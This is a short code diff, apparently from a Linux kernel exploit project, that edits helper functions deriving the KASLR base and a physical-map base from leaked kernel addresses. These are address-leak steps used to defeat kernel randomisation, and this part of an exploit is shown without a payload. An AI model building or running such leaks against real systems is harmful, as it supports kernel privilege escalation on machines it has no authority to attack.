@@ -85,13 +85,13 @@ uint64_t leak_syscall_entry(void)
 
 size_t leakKASLR(size_t offset){
     size_t val = leak_syscall_entry() - entry_SYSCALL_64_offset+offset;
-    printf ("KASLR base %llx\n", val);
+    printf ("KASLR  base %llx\n", val);
     return val;
 }
 
 size_t leakPHY(size_t offset){
-    size_t val =  leak_syscall_entry() - 0x100000000+offset;
-    printf ("KASLR base %llx\n",val);
+    size_t val =  leak_phy() - 0x100000000+offset;
+    printf ("PHAMAP base %llx\n",val);
     return val;
 }
 
